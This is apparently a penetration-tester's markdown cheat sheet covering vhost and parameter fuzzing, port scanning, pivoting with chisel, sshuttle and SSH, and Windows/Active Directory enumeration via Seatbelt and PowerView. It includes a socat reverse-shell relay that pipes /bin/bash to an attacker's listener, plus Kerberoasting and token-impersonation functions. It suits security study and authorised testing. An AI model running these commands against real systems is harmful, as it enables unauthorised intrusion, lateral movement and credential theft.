# Vhost discovery:

- **Gobuster:**
```bash
gobuster vhost -u <URL to fuzz> -w <wordlist>
```
- **WFUZZ**
```bash
wfuzz -u <URL> -w <wordlist> -H "Host: FUZZ.example.com" --hc <status codes to hide>
```

# FUZZ RCE Parameters
```bash
wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2
```
# Port Scanning with NetCat

```bash
nc -zv <IP> 1-65535
```
# Internal Network Acess (Reverse Port Forwarding)
#### Chisel (Reverse Connection):
> Make sure to add `socks5	127.0.0.1 1080` in **/etc/proxychains4.conf** file.
- On the local machine:
```bash
./chisel server -p 8000 --reverse
```
- On target host:
```bash
./chisel client <LHOST>:8000 R:socks
```
#### Internal Network access using SShuttle:
```bash
└─$ sshuttle -r <username>@<RHOST> <Internal IP/Subnet>
```

#### Reverse Port forward using OpenSSH
```powershell
ssh-keygen  # Generate key
```
- Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first
```powershell
sudo systemctl status ssh    # Check ssh status on attacking machine

sudo systemctl start ssh    # Start ssh on attacking machine

ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

OR

ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```
#### Reverse Shell Relay using Socat
```powershell
sudo nc -lvnp 443    # On Attacking Machine

./socat tcp-l:8000 tcp:ATTACKING_IP:443 &    # On Target Machine

nc 127.0.0.1 8000 -e /bin/bash    # On Target Machine
```

# Windows Enumeration using SEATBELT
```powershell
Seatbelt.exe -group=all

Seatbelt.exe -group=user

Seatbelt.exe -group=system

Seatbelt.exe -group=remote
```
# PowerView usage for Privilege Escalation
- #### Misc Functions:
```powershell
Export-PowerViewCSV             -   thread-safe CSV append
Resolve-IPAddress               -   resolves a hostname to an IP
ConvertTo-SID                   -   converts a given user/group name to a security identifier (SID)
Convert-ADName                  -   converts object names between a variety of formats
ConvertFrom-UACValue            -   converts a UAC int value to human readable form
Add-RemoteConnection            -   pseudo "mounts" a connection to a remote path using the specified credential object
Remove-RemoteConnection         -   destroys a connection created by New-RemoteConnection
Invoke-UserImpersonation        -   creates a new "runas /netonly" type logon and impersonates the token
Invoke-RevertToSelf             -   reverts any token impersonation
Get-DomainSPNTicket             -   request the kerberos ticket for a specified service principal name (SPN)
Invoke-Kerberoast               -   requests service tickets for kerberoast-able accounts and returns extracted ticket hashes
Get-PathAcl                     -   get the ACLs for a local/remote file path with optional group recursion
```
- #### Domain/LDAP Functions:
```powershell
Get-DomainDNSZone               -   enumerates the Active Directory DNS zones for a given domain
Get-DomainDNSRecord             -   enumerates the Active Directory DNS records for a given zone
Get-Domain                      -   returns the domain object for the current (or specified) domain
Get-DomainController            -   returns the domain controllers for the current (or specified) domain
Get-Forest                      -   returns the forest object for the current (or specified) forest
Get-ForestDomain                -   return all domains for the current (or specified) forest
Get-ForestGlobalCatalog         -   return all global catalogs for the current (or specified) forest
Find-DomainObjectPropertyOutlier-   finds user/group/computer objects in AD that have 'outlier' properties set
Get-DomainUser                  -   return all users or specific user objects in AD
New-DomainUser                  -   creates a new domain user (assuming appropriate permissions) and returns the user object
Set-DomainUserPassword          -   sets the password for a given user identity and returns the user object
Get-DomainUserEvent             -   enumerates account logon events (ID 4624) and Logon with explicit credential events
Get-DomainComputer              -   returns all computers or specific computer objects in AD
Get-DomainObject                -   returns all (or specified) domain objects in AD
Set-DomainObject                -   modifies a gven property for a specified active directory object
Get-DomainObjectAcl             -   returns the ACLs associated with a specific active directory object
Add-DomainObjectAcl             -   adds an ACL for a specific active directory object
Find-InterestingDomainAcl       -   finds object ACLs in the current (or specified) domain with modification rights set to non-built in objects
Get-DomainOU                    -   search for all organization units (OUs) or specific OU objects in AD
Get-DomainSite                  -   search for all sites or specific site objects in AD
Get-DomainSubnet                -   search for all subnets or specific subnets objects in AD
Get-DomainSID                   -   returns the SID for the current domain or the specified domain
Get-DomainGroup                 -   return all groups or specific group objects in AD
New-DomainGroup                 -   creates a new domain group (assuming appropriate permissions) and returns the group object
Get-DomainManagedSecurityGroup  -   returns all security groups in the current (or target) domain that have a manager set
Get-DomainGroupMember           -   return the members of a specific domain group
Add-DomainGroupMember           -   adds a domain user (or group) to an existing domain group, assuming appropriate permissions to do so
Get-DomainFileServer            -   returns a list of servers likely functioning as file servers
Get-DomainDFSShare              -   returns a list of all fault-tolerant distributed file systems for the current (or specified) domain
```
- #### GPO functions
```powershell
Get-DomainGPO                           -   returns all GPOs or specific GPO objects in AD
Get-DomainGPOLocalGroup                 -   returns all GPOs in a domain that modify local group memberships through 'Restricted Groups' or Group Policy preferences
Get-DomainGPOUserLocalGroupMapping      -   enumerates the machines where a specific domain user/group is a member of a specific local group, all through GPO correlation
Get-DomainGPOComputerLocalGroupMapping  -   takes a computer (or GPO) object and determines what users/groups are in the specified local group for the machine through GPO correlation
Get-DomainPolicy                        -   returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller
```
- #### Computer Enumeration Functions
```powershell
Get-NetLocalGroup                   -   enumerates the local groups on the local (or remote) machine
Get-NetLocalGroupMember             -   enumerates members of a specific local group on the local (or remote) machine
Get-NetShare                        -   returns open shares on the local (or a remote) machine
Get-NetLoggedon                     -   returns users logged on the local (or a remote) machine
Get-NetSession                      -   returns session information for the local (or a remote) machine
Get-RegLoggedOn                     -   returns who is logged onto the local (or a remote) machine through enumeration of remote registry keys
Get-NetRDPSession                   -   returns remote desktop/session information for the local (or a remote) machine
Test-AdminAccess                    -   rests if the current user has administrative access to the local (or a remote) machine
Get-NetComputerSiteName             -   returns the AD site where the local (or a remote) machine resides
Get-WMIRegProxy                     -   enumerates the proxy server and WPAD conents for the current user
Get-WMIRegLastLoggedOn              -   returns the last user who logged onto the local (or a remote) machine
Get-WMIRegCachedRDPConnection       -   returns information about RDP connections outgoing from the local (or remote) machine
Get-WMIRegMountedDrive              -   returns information about saved network mounted drives for the local (or remote) machine
Get-WMIProcess                      -   returns a list of processes and their owners on the local or remote machine
Find-InterestingFile                -   searches for files on the given path that match a series of specified criteria
```
- #### Threaded 'Meta'-Functions:
```powershell
Find-DomainUserLocation             -   finds domain machines where specific users are logged into
Find-DomainProcess                  -   finds domain machines where specific processes are currently running
Find-DomainUserEvent                -   finds logon events on the current (or remote domain) for the specified users
Find-DomainShare                    -   finds reachable shares on domain machines
Find-InterestingDomainShareFile     -   searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess               -   finds machines on the local domain where the current user has local administrator access
Find-DomainLocalGroupMember         -   enumerates the members of the specified local group on machines in the domain
```
- #### Domain Trust Functions:
```powershell
Get-DomainTrust                     -   returns all domain trusts for the current domain or a specified domain
Get-ForestTrust                     -   returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser               -   enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember        -   enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping              -   this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds
```